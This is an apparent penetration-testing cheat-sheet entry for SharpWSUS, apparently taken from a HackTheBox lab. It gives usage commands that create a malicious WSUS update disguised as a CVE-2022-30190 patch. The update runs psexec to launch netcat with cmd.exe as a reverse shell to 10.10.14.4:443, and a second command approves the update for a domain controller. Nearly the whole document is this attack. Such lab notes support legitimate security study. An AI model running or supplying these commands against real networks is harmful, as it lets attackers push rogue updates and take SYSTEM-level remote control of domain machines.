# Name
SharpWsus

## Usage
```
.\SharpWSUS.exe create /payload:"C:\temp\psexec_64.exe" /args:" -accepteula -s -d c:\temp\nc64.exe -e cmd.exe 10.10.14.4 443" /title:"CVE-2022-30190"

.\SharpWSUS.exe approve /updateid:<ID> /computername:dc.outdated.htb /groupname:"CriticalPatches"
```

## Source
https://github.com/nettitude/SharpWSUS
